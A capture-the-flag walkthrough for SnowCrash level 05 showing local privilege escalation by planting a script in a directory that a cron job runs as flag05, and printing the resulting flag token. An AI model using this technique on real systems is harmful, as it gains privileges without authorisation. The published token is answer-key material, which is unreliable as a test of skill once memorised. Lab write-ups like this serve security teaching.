# Level 05 - Privilege Escalation via Cron and Script Injection

In this level, we exploit a cron-executed script that runs as `flag05`. This allows us to inject malicious code that executes with elevated privileges.

---

## Step 1: Find Files Owned by `flag05`

```bash
level05@SnowCrash:~$ find / -path /proc -prune -o -user flag05 -print 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

The file `/usr/sbin/openarenaserver` is owned by `flag05` and executable by `level05`.

---

## Step 2: Inspect the Script

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script iterates over files in `/opt/openarenaserver/`, executes them with `bash`, and deletes them. It appears to be executed periodically — likely via `cron`.

---

## Step 3: Inject a Payload

Write a malicious script to that directory:

```bash
level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
```

After a few seconds, the file disappears, indicating it was executed and removed.

---

## Step 4: Check the Output

```bash
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## ✅ Summary

- Identified cron-executed script owned by `flag05`.
- Placed a malicious script in `/opt/openarenaserver/`.
- Payload was executed with elevated privileges.

### Flag Token:

```text
viuaaale9huek52boumoomioc
```
